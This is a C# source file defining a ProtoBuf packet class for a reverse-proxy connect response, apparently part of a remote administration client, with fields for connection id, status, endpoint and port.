using ProtoBuf;
using System;
using System.Collections.Generic;
using System.Text;
using xClient.Core.Packets;

namespace xClient.Core.ReverseProxy.Packets
{
    [ProtoContract]
    public class ReverseProxy_ConnectResponse : IPacket
    {
        [ProtoMember(1)]
        public int ConnectionId { get; set; }

        [ProtoMember(2)]
        public bool IsConnected { get; set; }

        [ProtoMember(3)]
        public long LocalEndPoint { get; set; }

        [ProtoMember(4)]
        public int LocalPort { get; set; }

        public ReverseProxy_ConnectResponse()
        {

        }

        public ReverseProxy_ConnectResponse(int ConnectionId, bool IsConnected, long LocalEndPoint, int LocalPort)
        {
            this.ConnectionId = ConnectionId;
            this.IsConnected = IsConnected;
            this.LocalEndPoint = LocalEndPoint;
            this.LocalPort = LocalPort;
        }

        public void Execute(Client client)
        {
            client.Send<ReverseProxy_ConnectResponse>(this);
        }
    }
}
